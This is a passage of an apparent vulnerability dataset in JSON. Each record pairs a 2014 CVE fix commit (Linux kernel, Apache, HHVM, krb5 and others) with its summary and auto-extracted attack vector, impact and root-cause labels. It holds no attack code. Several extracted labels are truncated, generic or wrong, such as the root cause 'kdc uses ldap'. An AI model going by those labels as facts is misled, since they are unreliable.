value","Impact":"bypass the espfix protection mechanism , and consequently makes it easier for local users to bypass the aslr protection mechanism","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"6f737ddfadb596d7d4a993f7ed2141ffd664a81c","cve_id":"CVE-2014-8117","cwe_id":"CWE-399","commit_message":"- reduce recursion level from 20 to 10 and make a symbolic constant for it.\n- pull out the guts of saving and restoring the output buffer into functions\n  and take care not to overwrite the error message if an error happened.","summary":"softmagic.c in file before 5.21 does not properly limit recursion, which allows remote attackers to cause a denial of service (CPU consumption or crash) via unspecified vectors.","commit_message_1":"- reduce recursion level from <number> to <number> and make a symbolic constant for it","Vulnerability Type":"Resource Management Errors","Attack Vector":"via unspecified vectors","Impact":"cause a denial of service ( cpu consumption or crash )","Root Cause":"does not properly limit recursion","Attack Type":"remote attacker"},{"commit_id":"d7cdad007c507e6c79f51f058dd77fab70ceb9f6","cve_id":"CVE-2014-8116","cwe_id":"CWE-399","commit_message":"Stop reporting bad capabilities after the first few.","summary":"The ELF parser (readelf.c) in file before 5.21 allows remote attackers to cause a denial of service (CPU consumption or crash) via a large number of (1) program or (2) section headers or (3) invalid capabilities.","commit_message_1":"stop reporting bad capability after the first few","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a large number of program or  section headers or invalid capabilities","Impact":"cause a denial of service ( cpu consumption or crash )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"3f1693d558d0758f829c8b53993f1749ddf6ffcb","cve_id":"CVE-2014-8109","cwe_id":"CWE-264","commit_message":"Merge r1642499 from trunk:\n\n  *) SECURITY: CVE-2014-8109 (cve.mitre.org)\n     mod_lua: Fix handling of the Require line when a LuaAuthzProvider is\n     used in multiple Require directives with different arguments.\n     PR57204 [Edward Lu <Chaosed0 gmail.com>]\n\nSubmitted By: Edward Lu\nCommitted By: covener\n\n\nSubmitted by: covener\nReviewed\/backported by: jim\n\n\ngit-svn-id: https:\/\/svn.apache.org\/repos\/asf\/httpd\/httpd\/branches\/2.4.x@1642861 13f79535-47bb-0310-9956-ffa450edef68","summary":"mod_lua.c in the mod_lua module in the Apache HTTP Server 2.3.x and 2.4.x through 2.4.10 does not support an httpd configuration in which the same Lua authorization provider is used with different arguments within different contexts, which allows remote attackers to bypass intended access restrictions in opportunistic circumstances by leveraging multiple Require directives, as demonstrated by a configuration that specifies authorization for one group to access a certain directory, and authorization for a second group to access a second directory.","commit_message_1":"* ) security : <cve_id> ( <file>","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by leveraging multiple require directives , as demonstrated by a configuration that specifies authorization for one group to access a certain directory , and authorization for a second group to access a second directory","Impact":"bypass intended access restrictions in opportunistic circumstances","Root Cause":"does not support an httpd configuration","Attack Type":"remote attacker"},{"commit_id":"a2b9e6c1a35afcc0973acb72e591c714e78885ff","cve_id":"CVE-2014-7842","cwe_id":"CWE-362","commit_message":"KVM: x86: Don't report guest userspace emulation error to userspace\n\nCommit fc3a9157d314 (\"KVM: X86: Don't report L2 emulation failures to\nuser-space\") disabled the reporting of L2 (nested guest) emulation failures to\nuserspace due to race-condition between a vmexit and the instruction emulator.\nThe same rational applies also to userspace applications that are permitted by\nthe guest OS to access MMIO area or perform PIO.\n\nThis patch extends the current behavior - of injecting a #UD instead of\nreporting it to userspace - also for guest userspace code.\n\nSigned-off-by: Nadav Amit <namit@cs.technion.ac.il>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"Race condition in arch\/x86\/kvm\/x86.c in the Linux kernel before 3.17.4 allows guest OS users to cause a denial of service (guest OS crash) via a crafted application that performs an MMIO transaction or a PIO transaction to trigger a guest userspace emulation error report, a similar issue to CVE-2010-5313.","commit_message_1":"x86 : do n't report guest userspace emulation error to userspace commit fc3a9157d314 ( `` kvm : x86 : do n't report l2 emulation failure to user-space '' ) disabled the reporting of l2 ( nested guest ) emulation failure to userspace due to race-condition between a vmexit and the instruction emulator","Vulnerability Type":"Race Condition","Attack Vector":"via a crafted application that performs an mmio transaction or a pio transaction to trigger a guest userspace emulation error report , a similar issue to cve - 2010 - 5313","Impact":"cause a denial of service ( guest os crash )","Root Cause":"caused by an error related to the reporting of an emulation failure to user space","Attack Type":"attacker"},{"commit_id":"e40607cbe270a9e8360907cb1e62ddf0736e4864","cve_id":"CVE-2014-7841","cwe_id":"CWE-399","commit_message":"net: sctp: fix NULL pointer dereference in af->from_addr_param on malformed packet\n\nAn SCTP server doing ASCONF will panic on malformed INIT ping-of-death\nin the form of:\n\n  ------------ INIT[PARAM: SET_PRIMARY_IP] ------------>\n\nWhile the INIT chunk parameter verification dissects through many things\nin order to detect malformed input, it misses to actually check parameters\ninside of parameters. E.g. RFC5061, section 4.2.4 proposes a 'set primary\nIP address' parameter in ASCONF, which has as a subparameter an address\nparameter.\n\nSo an attacker may send a parameter type other than SCTP_PARAM_IPV4_ADDRESS\nor SCTP_PARAM_IPV6_ADDRESS, param_type2af() will subsequently return 0\nand thus sctp_get_af_specific() returns NULL, too, which we then happily\ndereference unconditionally through af->from_addr_param().\n\nThe trace for the log:\n\nBUG: unable to handle kernel NULL pointer dereference at 0000000000000078\nIP: [<ffffffffa01e9c62>] sctp_process_init+0x492\/0x990 [sctp]\nPGD 0\nOops: 0000 [#1] SMP\n[...]\nPid: 0, comm: swapper Not tainted 2.6.32-504.el6.x86_64 #1 Bochs Bochs\nRIP: 0010:[<ffffffffa01e9c62>]  [<ffffffffa01e9c62>] sctp_process_init+0x492\/0x990 [sctp]\n[...]\nCall Trace:\n <IRQ>\n [<ffffffffa01f2add>] ? sctp_bind_addr_copy+0x5d\/0xe0 [sctp]\n [<ffffffffa01e1fcb>] sctp_sf_do_5_1B_init+0x21b\/0x340 [sctp]\n [<ffffffffa01e3751>] sctp_do_sm+0x71\/0x1210 [sctp]\n [<ffffffffa01e5c09>] ? sctp_endpoint_lookup_assoc+0xc9\/0xf0 [sctp]\n [<ffffffffa01e61f6>] sctp_endpoint_bh_rcv+0x116\/0x230 [sctp]\n [<ffffffffa01ee986>] sctp_inq_push+0x56\/0x80 [sctp]\n [<ffffffffa01fcc42>] sctp_rcv+0x982\/0xa10 [sctp]\n [<ffffffffa01d5123>] ? ipt_local_in_hook+0x23\/0x28 [iptable_filter]\n [<ffffffff8148bdc9>] ? nf_iterate+0x69\/0xb0\n [<ffffffff81496d10>] ? ip_local_deliver_finish+0x0\/0x2d0\n [<ffffffff8148bf86>] ? nf_hook_slow+0x76\/0x120\n [<ffffffff81496d10>] ? ip_local_deliver_finish+0x0\/0x2d0\n[...]\n\nA minimal way to address this is to check for NULL as we do on all\nother such occasions where we know sctp_get_af_specific() could\npossibly return with NULL.\n\nFixes: d6de3097592b (\"[SCTP]: Add the handling of \"Set Primary IP Address\" parameter to INIT\")\nSigned-off-by: Daniel Borkmann <dborkman@redhat.com>\nCc: Vlad Yasevich <vyasevich@gmail.com>\nAcked-by: Neil Horman <nhorman@tuxdriver.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The sctp_process_param function in net\/sctp\/sm_make_chunk.c in the SCTP implementation in the Linux kernel before 3.17.4, when ASCONF is used, allows remote attackers to cause a denial of service (NULL pointer dereference and system crash) via a malformed INIT chunk.","commit_message_1":"sctp : fix null pointer dereference in af- > from_addr_param on malformed packet an sctp server doing asconf will panic on malformed init ping-of-death in the form of : -- -- -- -- -- -- init [ param : set_primary_ip ] -- -- -- -- -- -- > while the init chunk parameter verification dissects through many thing in order to detect malformed input , it miss to actually check parameter inside of parameter","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a malformed init chunk","Impact":"cause a denial of service ( pointer dereference and system crash )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"086ba77a6db00ed858ff07451bedee197df868c9","cve_id":"CVE-2014-7826","cwe_id":"CWE-264","commit_message":"tracing\/syscalls: Ignore numbers outside NR_syscalls' range\n\nARM has some private syscalls (for example, set_tls(2)) which lie\noutside the range of NR_syscalls.  If any of these are called while\nsyscall tracing is being performed, out-of-bounds array access will\noccur in the ftrace and perf sys_{enter,exit} handlers.\n\n # trace-cmd record -e raw_syscalls:* true && trace-cmd report\n ...\n true-653   [000]   384.675777: sys_enter:            NR 192 (0, 1000, 3, 4000022, ffffffff, 0)\n true-653   [000]   384.675812: sys_exit:             NR 192 = 1995915264\n true-653   [000]   384.675971: sys_enter:            NR 983045 (76f74480, 76f74000, 76f74b28, 76f74480, 76f76f74, 1)\n true-653   [000]   384.675988: sys_exit:             NR 983045 = 0\n ...\n\n # trace-cmd record -e syscalls:* true\n [   17.289329] Unable to handle kernel paging request at virtual address aaaaaace\n [   17.289590] pgd = 9e71c000\n [   17.289696] [aaaaaace] *pgd=00000000\n [   17.289985] Internal error: Oops: 5 [#1] PREEMPT SMP ARM\n [   17.290169] Modules linked in:\n [   17.290391] CPU: 0 PID: 704 Comm: true Not tainted 3.18.0-rc2+ #21\n [   17.290585] task: 9f4dab00 ti: 9e710000 task.ti: 9e710000\n [   17.290747] PC is at ftrace_syscall_enter+0x48\/0x1f8\n [   17.290866] LR is at syscall_trace_enter+0x124\/0x184\n\nFix this by ignoring out-of-NR_syscalls-bounds syscall numbers.\n\nCommit cd0980fc8add \"tracing: Check invalid syscall nr while tracing syscalls\"\nadded the check for less than zero, but it should have also checked\nfor greater than NR_syscalls.\n\nLink: http:\/\/lkml.kernel.org\/p\/1414620418-29472-1-git-send-email-rabin@rab.in\n\nFixes: cd0980fc8add \"tracing: Check invalid syscall nr while tracing syscalls\"\nCc: stable@vger.kernel.org # 2.6.33+\nSigned-off-by: Rabin Vincent <rabin@rab.in>\nSigned-off-by: Steven Rostedt <rostedt@goodmis.org>","summary":"kernel\/trace\/trace_syscalls.c in the Linux kernel through 3.17.2 does not properly handle private syscall numbers during use of the ftrace subsystem, which allows local users to gain privileges or cause a denial of service (invalid pointer dereference) via a crafted application.","commit_message_1":"ignore number outside nr_syscalls ' range arm ha some private syscalls ( for example , set_tls ( <number> ) ) which lie outside the range of nr_syscalls","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted application","Impact":"gain privileges or cause a denial of service ( invalid pointer dereference )","Root Cause":"does not properly handle private syscall numbers during use of the ftrace subsystem","Attack Type":"local attacker"},{"commit_id":"3d4405226d27b3a215e4d03cfa51f536244e5de7","cve_id":"CVE-2014-7284","cwe_id":"CWE-200","commit_message":"net: avoid dependency of net_get_random_once on nop patching\n\nnet_get_random_once depends on the static keys infrastructure to patch up\nthe branch to the slow path during boot. This was realized by abusing the\nstatic keys api and defining a new initializer to not enable the call\nsite while still indicating that the branch point should get patched\nup. This was needed to have the fast path considered likely by gcc.\n\nThe static key initialization during boot up normally walks through all\nthe registered keys and either patches in ideal nops or enables the jump\nsite but omitted that step on x86 if ideal nops where already placed at\nstatic_key branch points. Thus net_get_random_once branches not always\nbecame active.\n\nThis patch switches net_get_random_once to the ordinary static_key\napi and thus places the kernel fast path in the - by gcc considered -\nunlikely path.  Microbenchmarks on Intel and AMD x86-64 showed that\nthe unlikely path actually beats the likely path in terms of cycle cost\nand that different nop patterns did not make much difference, thus this\nswitch should not be noticeable.\n\nFixes: a48e42920ff38b (\"net: introduce new macro net_get_random_once\")\nReported-by: Tuomas R\u00e4s\u00e4nen <tuomasjjrasanen@tjjr.fi>\nCc: Linus Torvalds <torvalds@linux-foundation.org>\nSigned-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The net_get_random_once implementation in net\/core\/utils.c in the Linux kernel 3.13.x and 3.14.x before 3.14.5 on certain Intel processors does not perform the intended slow-path operation to initialize random seeds, which makes it easier for remote attackers to spoof or disrupt IP communication by leveraging the predictability of TCP sequence numbers, TCP and UDP port numbers, and IP ID values.","commit_message_1":"avoid dependency of net_get_random_once on nop patching net_get_random_once depends on the static key infrastructure to patch up the branch to the slow path during boot","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by leveraging the predictability of tcp sequence numbers , tcp and udp port numbers , and ip id values","Impact":"spoof or disrupt ip communication","Root Cause":"does not perform the intended slow - path operation to initialize random seeds","Attack Type":"remote attacker"},{"commit_id":"c88547a8119e3b581318ab65e9b72f27f23e641d","cve_id":"CVE-2014-7283","cwe_id":"CWE-399","commit_message":"xfs: fix directory hash ordering bug\n\nCommit f5ea1100 (\"xfs: add CRCs to dir2\/da node blocks\") introduced\nin 3.10 incorrectly converted the btree hash index array pointer in\nxfs_da3_fixhashpath(). It resulted in the the current hash always\nbeing compared against the first entry in the btree rather than the\ncurrent block index into the btree block's hash entry array. As a\nresult, it was comparing the wrong hashes, and so could misorder the\nentries in the btree.\n\nFor most cases, this doesn't cause any problems as it requires hash\ncollisions to expose the ordering problem. However, when there are\nhash collisions within a directory there is a very good probability\nthat the entries will be ordered incorrectly and that actually\nmatters when duplicate hashes are placed into or removed from the\nbtree block hash entry array.\n\nThis bug results in an on-disk directory corruption and that results\nin directory verifier functions throwing corruption warnings into\nthe logs. While no data or directory entries are lost, access to\nthem may be compromised, and attempts to remove entries from a\ndirectory that has suffered from this corruption may result in a\nfilesystem shutdown.  xfs_repair will fix the directory hash\nordering without data loss occuring.\n\n[dchinner: wrote useful a commit message]\n\ncc: <stable@vger.kernel.org>\nReported-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: Mark Tinguely <tinguely@sgi.com>\nReviewed-by: Ben Myers <bpm@sgi.com>\nSigned-off-by: Dave Chinner <david@fromorbit.com>","summary":"The xfs_da3_fixhashpath function in fs\/xfs\/xfs_da_btree.c in the xfs implementation in the Linux kernel before 3.14.2 does not properly compare btree hash values, which allows local users to cause a denial of service (filesystem corruption, and OOPS or panic) via operations on directories that have hash collisions, as demonstrated by rmdir operations.","commit_message_1":"fix directory hash ordering bug commit f5ea1100 ( `` xfs : add crcs to dir2\/da node block '' ) introduced in <file> incorrectly converted the btree hash index array pointer in xfs_da3_fixhashpath ( )","Vulnerability Type":"Resource Management Errors","Attack Vector":"via operations on directories that have hash collisions , as demonstrated by rmdir operations","Impact":"cause a denial of service ( filesystem corruption , and oops or panic )","Root Cause":"does not properly compare btree hash values","Attack Type":"local attacker"},{"commit_id":"18f39e7be0121317550d03e267e3ebd4dbfbb3ce","cve_id":"CVE-2014-7145","cwe_id":"CWE-399","commit_message":"[CIFS] Possible null ptr deref in SMB2_tcon\n\nAs Raphael Geissert pointed out, tcon_error_exit can dereference tcon\nand there is one path in which tcon can be null.\n\nSigned-off-by: Steve French <smfrench@gmail.com>\nCC: Stable <stable@vger.kernel.org> # v3.7+\nReported-by: Raphael Geissert <geissert@debian.org>","summary":"The SMB2_tcon function in fs\/cifs\/smb2pdu.c in the Linux kernel before 3.16.3 allows remote CIFS servers to cause a denial of service (NULL pointer dereference and client system crash) or possibly have unspecified other impact by deleting the IPC$ share during resolution of DFS referrals.","commit_message_1":"possible null ptr deref in smb2_tcon a raphael geissert pointed out , tcon_error_exit can dereference tcon and there is one path in which tcon can be null","Vulnerability Type":"Resource Management Errors","Attack Vector":"by deleting the ipc $ share during resolution of dfs referrals","Impact":"cause a denial of service ( pointer dereference and client system crash ) or possibly have unspecified other impact","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"c27a3e4d667fdcad3db7b104f75659478e0c68d8","cve_id":"CVE-2014-6418","cwe_id":"CWE-399","commit_message":"libceph: do not hard code max auth ticket len\n\nWe hard code cephx auth ticket buffer size to 256 bytes.  This isn't\nenough for any moderate setups and, in case tickets themselves are not\nencrypted, leads to buffer overflows (ceph_x_decrypt() errors out, but\nceph_decode_copy() doesn't - it's just a memcpy() wrapper).  Since the\nbuffer is allocated dynamically anyway, allocated it a bit later, at\nthe point where we know how much is going to be needed.\n\nFixes: http:\/\/tracker.ceph.com\/issues\/8979\n\nCc: stable@vger.kernel.org\nSigned-off-by: Ilya Dryomov <ilya.dryomov@inktank.com>\nReviewed-by: Sage Weil <sage@redhat.com>","summary":"net\/ceph\/auth_x.c in Ceph, as used in the Linux kernel before 3.16.3, does not properly validate auth replies, which allows remote attackers to cause a denial of service (system crash) or possibly have unspecified other impact via crafted data from the IP address of a Ceph Monitor.","commit_message_1":"do not hard code max auth ticket len we hard code cephx auth ticket buffer size to <number> byte","Vulnerability Type":"Resource Management Errors","Attack Vector":"via crafted data from the ip address of a ceph monitor","Impact":"cause a denial of service ( system crash ) or possibly have unspecified other impact","Root Cause":"does not properly validate auth replies","Attack Type":"remote attacker"},{"commit_id":"c03aa9f6e1f938618e6db2e23afef0574efeeb65","cve_id":"CVE-2014-6410","cwe_id":"CWE-399","commit_message":"udf: Avoid infinite loop when processing indirect ICBs\n\nWe did not implement any bound on number of indirect ICBs we follow when\nloading inode. Thus corrupted medium could cause kernel to go into an\ninfinite loop, possibly causing a stack overflow.\n\nFix the possible stack overflow by removing recursion from\n__udf_read_inode() and limit number of indirect ICBs we follow to avoid\ninfinite loops.\n\nSigned-off-by: Jan Kara <jack@suse.cz>","summary":"The __udf_read_inode function in fs\/udf\/inode.c in the Linux kernel through 3.16.3 does not restrict the amount of ICB indirection, which allows physically proximate attackers to cause a denial of service (infinite loop or stack consumption) via a UDF filesystem with a crafted inode.","commit_message_1":"avoid infinite loop when processing indirect icbs we did not implement any bound on number of indirect icbs we follow when loading inode","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a udf filesystem with a crafted inode","Impact":"cause a denial of service ( infinite loop or stack consumption )","Root Cause":"does not restrict the amount of icb indirection","Attack Type":"local attacker"},{"commit_id":"e3abe7d7585ecc420a7cab73313216613aadad5a","cve_id":"CVE-2014-6396","cwe_id":"CWE-119","commit_message":"Fixed heap overflow caused by length","summary":"The dissector_postgresql function in dissectors\/ec_postgresql.c in Ettercap before 0.8.1 allows remote attackers to cause a denial of service and possibly execute arbitrary code via a crafted password length, which triggers a 0 character to be written to an arbitrary memory location.","commit_message_1":"fixed heap overflow caused by length","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted password length , which triggers a 0 character to be written to an arbitrary memory location","Impact":"cause a denial of service and possibly execute arbitrary code","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"7135ec229882370a00411aa50030eada6034cc1b","cve_id":"CVE-2014-6229","cwe_id":"CWE-200","commit_message":"Fix potential security leak in HashContext\n\nSummary: CVE-2014-6229\n\nThis is not a NUL-terminated string, it's a fixed-size block of data.\nThe risks were key truncation (if there happens to be a NUL byte in the\nkey) or over-reading (which would be information leakage).\n\nReviewed By: @ptarjan\n\nDifferential Revision: D1533546","summary":"The HashContext class in hphp\/runtime\/ext\/ext_hash.cpp in Facebook HipHop Virtual Machine (HHVM) before 3.3.0 incorrectly expects that a certain key string uses '0' for termination, which allows remote attackers to obtain sensitive information by leveraging read access beyond the end of the string, and makes it easier for remote attackers to defeat cryptographic protection mechanisms by leveraging truncation of a string containing an internal '0' character.","commit_message_1":"fix potential security leak in hashcontext summary : <cve_id> this is not a nul-terminated string , it 's a fixed-size block of data","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by leveraging read access beyond the end of the string , and makes it easier for remote attackers to defeat cryptographic protection mechanisms by leveraging truncation of a string containing an internal ' 0 ' character","Impact":"obtain sensitive information","Root Cause":"uses ' 0 ' for termination","Attack Type":"remote attacker"},{"commit_id":"1f91e076a585118495b976a413c1df40f6fd3d41","cve_id":"CVE-2014-6228","cwe_id":"CWE-189","commit_message":"Fix integer overflow in chunk_split\n\nReviewed By: @ptarjan\n\nDifferential Revision: D1515947","summary":"Integer overflow in the string_chunk_split function in hphp\/runtime\/base\/zend-string.cpp in Facebook HipHop Virtual Machine (HHVM) before 3.3.0 allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via crafted arguments to the chunk_split function.","commit_message_1":"fix integer overflow in chunk_split","Vulnerability Type":"integer overflow","Attack Vector":"via crafted arguments to the chunk _ split function","Impact":"cause a denial of service ( application crash ) or possibly have unspecified other impact","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"410dd3cf4c9b36f27ed4542ee18b1af5e68645a4","cve_id":"CVE-2014-5472","cwe_id":"CWE-20","commit_message":"isofs: Fix unbounded recursion when processing relocated directories\n\nWe did not check relocated directory in any way when processing Rock\nRidge 'CL' tag. Thus a corrupted isofs image can possibly have a CL\nentry pointing to another CL entry leading to possibly unbounded\nrecursion in kernel code and thus stack overflow or deadlocks (if there\nis a loop created from CL entries).\n\nFix the problem by not allowing CL entry to point to a directory entry\nwith CL entry (such use makes no good sense anyway) and by checking\nwhether CL entry doesn't point to itself.\n\nCC: stable@vger.kernel.org\nReported-by: Chris Evans <cevans@google.com>\nSigned-off-by: Jan Kara <jack@suse.cz>","summary":"The parse_rock_ridge_inode_internal function in fs\/isofs\/rock.c in the Linux kernel through 3.16.1 allows local users to cause a denial of service (unkillable mount process) via a crafted iso9660 image with a self-referential CL entry.","commit_message_1":"fix unbounded recursion when processing relocated directory we did not check relocated directory in any way when processing rock ridge 'cl ' tag","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted iso9660 image with a self - referential cl entry","Impact":"cause a denial of service ( unkillable mount process )","Root Cause":"caused by the improper checking of relocated directories by the parse_rock_ridge_inode_internal() function within the ISOFS subsystem","Attack Type":"local attacker"},{"commit_id":"ab6fdeb84fb090b48606b6f7933028cfe7bf3a5e","cve_id":"CVE-2014-5386","cwe_id":"CWE-310","commit_message":"Fix mcrypt_create_iv(..., MCRYPT_RAND) to auto-seed RNG\n\nSummary: Without seeding the random number generator,\nwe'll always get the same IV, and that reduces the security\nof this function.\n\nFortunately, f_rand() has all of that logic for auto-seeding\nand selection of a suitable initial seed built-in.\n\nRealistically, using MCRYPT_RAND should be deprecated.\nI'm going to wait on PHP Internals to make a decision on\nhttps:\/\/wiki.php.net\/rfc\/deprecate_mcrypt_rand\nbefore adding that warning however, so that our test suite\nremains consistent.\n\nCredit: Theodore R. Smith of PHP Experts, Inc. <theodorephpexperts.pro>\n\nCloses #3496\n\nReviewed By: @ptarjan\n\nDifferential Revision: D1502435","summary":"The mcrypt_create_iv function in hphp\/runtime\/ext\/mcrypt\/ext_mcrypt.cpp in Facebook HipHop Virtual Machine (HHVM) before 3.3.0 does not seed the random number generator, which makes it easier for remote attackers to defeat cryptographic protection mechanisms by leveraging the use of a single initialization vector.","commit_message_1":"fix mcrypt_create_iv (","Vulnerability Type":"Cryptographic Issues","Attack Vector":"by leveraging the use of a single initialization vector","Impact":"defeat cryptographic protection mechanisms","Root Cause":"caused by the failure to seed the random number generator","Attack Type":"remote attacker"},{"commit_id":"04038bf3633c4b909b5ded3072dc88c8c419bf16","cve_id":"CVE-2014-5354","cwe_id":null,"commit_message":"Support keyless principals in LDAP [CVE-2014-5354]\n\nOperations like \"kadmin -q 'addprinc -nokey foo'\" or\n\"kadmin -q 'purgekeys -all foo'\" result in principal entries with\nno keys present, so krb5_encode_krbsecretkey() would just return\nNULL, which then got unconditionally dereferenced in\nkrb5_add_ber_mem_ldap_mod().\n\nApply some fixes to krb5_encode_krbsecretkey() to handle zero-key\nprincipals better, correct the test for an allocation failure, and\nslightly restructure the cleanup handler to be shorter and more\nappropriate for the usage.  Once it no longer short-circuits when\nn_key_data is zero, it will produce an array of length two with both\nentries NULL, which is treated as an empty list by the LDAP library,\nthe correct behavior for a keyless principal.\n\nHowever, attributes with empty values are only handled by the LDAP\nlibrary for Modify operations, not Add operations (which only get\na sequence of Attribute, with no operation field).  Therefore, only\nadd an empty krbprincipalkey to the modlist when we will be performing a\nModify, and not when we will be performing an Add, which is conditional\non the (misspelled) create_standalone_prinicipal boolean.\n\nCVE-2014-5354:\n\nIn MIT krb5, when kadmind is configured to use LDAP for the KDC\ndatabase, an authenticated remote attacker can cause a NULL\ndereference by inserting into the database a principal entry which\ncontains no long-term keys.\n\nIn order for the LDAP KDC backend to translate a principal entry\nfrom the database abstraction layer into the form expected by the\nLDAP schema, the principal's keys are encoded into a\nNULL-terminated array of length-value entries to be stored in the\nLDAP database.  However, the subroutine which produced this array\ndid not correctly handle the case where no keys were present,\nreturning NULL instead of an empty array, and the array was\nunconditionally dereferenced while adding to the list of LDAP\noperations to perform.\n\nVersions of MIT krb5 prior to 1.12 did not expose a way for\nprincipal entries to have no long-term key material, and\ntherefore are not vulnerable.\n\n    CVSSv2 Vector: AV:N\/AC:M\/Au:S\/C:N\/I:N\/A:P\/E:H\/RL:OF\/RC:C\n\nticket: 8041 (new)\ntags: pullup\ntarget_version: 1.13.1\nsubject: kadmind with ldap backend crashes when putting keyless entries","summary":"plugins\/kdb\/ldap\/libkdb_ldap\/ldap_principal2.c in MIT Kerberos 5 (aka krb5) 1.12.x and 1.13.x before 1.13.1, when the KDC uses LDAP, allows remote authenticated users to cause a denial of service (NULL pointer dereference and daemon crash) by creating a database entry for a keyless principal, as demonstrated by a kadmin *add_principal -nokey* or *purgekeys -all* command.","commit_message_1":"support keyless principal in ldap [ <cve_id> ] operation like `` kadmin -q 'addprinc -nokey foo ' '' or '' kadmin -q 'purgekeys -all foo ' '' result in principal entry with no key present , so krb5_encode_krbsecretkey ( ) would just return null , which then got unconditionally dereferenced in krb5_add_ber_mem_ldap_mod ( )","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"by creating a database entry for a keyless","Impact":"cause a denial of service ( pointer dereference and daemon crash","Root Cause":"kdc uses ldap","Attack Type":"remote attacker"},{"commit_id":"d1f707024f1d0af6e54a18885322d70fa15ec4d3","cve_id":"CVE-2014-5353","cwe_id":null,"commit_message":"Fix LDAP misused policy name crash [CVE-2014-5353]\n\nIn krb5_ldap_get_password_policy_from_dn, if LDAP_SEARCH returns\nsuccessfully with no results, return KRB5_KDB_NOENTRY instead of\nreturning success with a zeroed-out policy object.  This fixes a null\ndereference when an admin attempts to use an LDAP ticket policy name\nas a password policy name.\n\nCVE-2014-5353:\n\nIn MIT krb5, when kadmind is configured to use LDAP for the KDC\ndatabase, an authenticated remote attacker can cause a NULL dereference\nby attempting to use a named ticket policy object as a password policy\nfor a principal.  The attacker needs to be authenticated as a user who\nhas the elevated privilege for setting password policy by adding or\nmodifying principals.\n\nQueries to LDAP scoped to the krbPwdPolicy object class will correctly\nnot return entries of other classes, such as ticket policy objects, but\nmay return success with no returned elements if an object with the\nrequested DN exists in a different object class.  In this case, the\nroutine to retrieve a password policy returned success with a password\npolicy object that consisted entirely of zeroed memory.  In particular,\naccesses to the policy name will dereference a NULL pointer.  KDC\noperation does not access the policy name field, but most kadmin\noperations involving the principal with incorrect password policy\nwill trigger the crash.\n\nThanks to Patrik Kis for reporting this problem.\n\nCVSSv2 Vector: AV:N\/AC:M\/Au:S\/C:N\/I:N\/A:C\/E:H\/RL:OF\/RC:C\n\n[kaduk@mit.edu: CVE description and CVSS score]\n\nticket: 8051 (new)\ntarget_version: 1.13.1\ntags: pullup","summary":"The krb5_ldap_get_password_policy_from_dn function in plugins\/kdb\/ldap\/libkdb_ldap\/ldap_pwd_policy.c in MIT Kerberos 5 (aka krb5) before 1.13.1, when the KDC uses LDAP, allows remote authenticated users to cause a denial of service (daemon crash) via a successful LDAP query with no results, as demonstrated by using an incorrect object type for a password policy.","commit_message_1":"fix ldap misused policy name crash [ <cve_id> ] in krb5_ldap_get_password_policy_from_dn , if ldap_search return successfully with no result , return krb5_kdb_noentry instead of returning success with a zeroed-out policy object","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a successful LDAP query with no results","Impact":"cause a denial of service ( daemon crash ) via a successful ld","Root Cause":"kdc uses ldap","Attack Type":"remote attacker"},{"commit_id":"af0ed4df4dfae762ab5fb605f5a0c8f59cb4f6ca","cve_id":"CVE-2014-5351","cwe_id":"CWE-255","commit_message":"Return only new keys in randkey [CVE-2014-5351]\n\nIn kadmind's randkey operation, if a client specifies the keepold\nflag, do not include the preserved old keys in the response.\n\nCVE-2014-5351:\n\nAn authenticated remote attacker can retrieve the current keys for a\nservice principal when generating a new set of keys for that\nprincipal.  The attacker needs to be authenticated as a user who has\nthe elevated privilege for randomizing the keys of other principals.\n\nNormally, when a Kerberos administrator randomizes the keys of a\nservice principal, kadmind returns only the new keys.  This prevents\nan administrator who lacks legitimate privileged access to a service\nfrom forging tickets to authenticate to that service.  If the\n\"keepold\" flag to the kadmin randkey RPC operation is true, kadmind\nretains the old keys in the KDC database as intended, but also\nunexpectedly returns the old keys to the client, which exposes the\nservice to ticket forgery attacks from the administrator.\n\nA mitigating factor is that legitimate clients of the affected service\nwill start failing to authenticate to the service once they begin to\nreceive service tickets encrypted in the new keys.  The affected\nservice will be unable to decrypt the newly issued tickets, possibly\nalerting the legitimate administrator of the affected service.\n\nCVSSv2: AV:N\/AC:H\/Au:S\/C:P\/I:N\/A:N\/E:POC\/RL:OF\/RC:C\n\n[tlyu@mit.edu: CVE description and CVSS score]\n\nticket: 8018 (new)\ntarget_version: 1.13\ntags: pullup","summary":"The kadm5_randkey_principal_3 function in lib\/kadm5\/srv\/svr_principal.c in kadmind in MIT Kerberos 5 (aka krb5) before 1.13 sends old keys in a response to a -randkey -keepold request, which allows remote authenticated users to forge tickets by leveraging administrative access.","commit_message_1":"return only new key in randkey [ <cve_id> ] in kadmind 's randkey operation , if a client specifies the keepold flag , do not include the preserved old key in the response","Vulnerability Type":"Credentials Management Errors","Attack Vector":"by leveraging administrative access","Impact":"bypass security restrictions","Root Cause":"caused by the return of an old key when randomizing the keys for a service","Attack Type":"remote attacker"},{"commit_id":"b2d0e6f92310bb14a15aa2f8e96e1fb5379776dd","cve_id":"CVE-2014-5336","cwe_id":"CWE-20","commit_message":"Request: new request session flag to mark those files opened by FDT\n\nThis patch aims to fix a potential DDoS problem that can be 